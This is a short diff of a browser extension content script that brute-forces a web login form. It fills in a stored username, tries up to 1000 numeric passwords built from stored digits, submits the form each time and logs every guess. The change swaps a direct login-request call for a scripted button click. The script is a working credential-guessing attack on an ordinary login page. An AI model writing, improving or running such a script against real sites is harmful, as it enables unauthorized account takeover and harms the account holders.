@@ -3,9 +3,7 @@ It is ran when the "start" button is clicked
 on the main popup. The script is unable to interact with the popup
 input boxes, so arguments have to be passed to it. */
 
-//We're going to eventually have to append this to the page
-
-console.log("Script Injection Successful.");
+console.log("Injection complete.");
 var username;
 var lastthree;
 chrome.storage.sync.get("userbox", function(data1) {
@@ -48,9 +46,9 @@ for (let numbertry = 0; numbertry != 1000; numbertry++) {
 		});
 		formUsername.value = username;
 		formPassw.value = numbertrytostr;
-		//prevent page refresh
+		//prevent page refresh, and click button from script to prevent errors
 		form.preventDefault();
-		Login.submitLoginRequest(null, null, formUsername.value, formPassw.value);
+		formButton.click();
 		console.log('Testing password:');
 		console.log(passreal);
 	}
